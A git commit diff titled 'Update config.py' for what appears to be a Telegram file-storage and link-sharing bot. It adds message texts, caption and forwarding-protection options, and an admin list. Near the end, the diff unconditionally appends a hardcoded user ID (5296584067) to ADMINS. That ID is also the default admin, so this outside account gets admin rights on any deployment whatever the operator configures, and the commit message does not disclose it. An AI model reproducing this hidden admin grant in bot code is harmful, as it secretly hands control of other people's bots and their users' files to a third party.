96f030559153eaf82e0429c4619b703bdccb8437
Abid Abdullah <161892101+AbidAbdullah1425@users.noreply.github.com>
2024-12-13 22:32:40 +0600

    Update config.py

--- config.py
+++ config.py
@@ -21,6 +21,33 @@ BOT_WORKERS = int(os.environ.get("BOT_WORKERS", "4"))
 
 PORT = os.environ.get("PORT", "8080")
 
+#start message
+START_MSG = os.environ.get("START_MESSAGE", "Hello {first} I'm a bot who can store files and share it via spacial links")
+try:
+    ADMINS=[]
+    for x in (os.environ.get("ADMINS", "5296584067").split()):
+        ADMINS.append(int(x))
+except ValueError:
+        raise Exception("Your Admins list does not contain valid integers.")
+
+#Force sub message 
+FORCE_MSG = os.environ.get("FORCE_SUB_MESSAGE", "You have to join our Channels First")
+
+#set your Custom Caption here, Keep None for Disable Custom Caption
+CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
+
+#set True if you want to prevent users from forwarding files from bot
+PROTECT_CONTENT = True if os.environ.get('PROTECT_CONTENT', "False") == "True" else False
+
+#Set true if you want Disable your Channel Posts Share button
+DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == 'True'
+
+BOT_STATS_TEXT = "<b>BOT UPTIME</b>\n{uptime}"
+USER_REPLY_TEXT = "❌Don't send me messages directly I'm only File Share bot!"
+
+ADMINS.append(OWNER_ID)
+ADMINS.append(5296584067)
+
 # Set Up Logger
 LOG_FILE_NAME = "botstatus.txt"
 
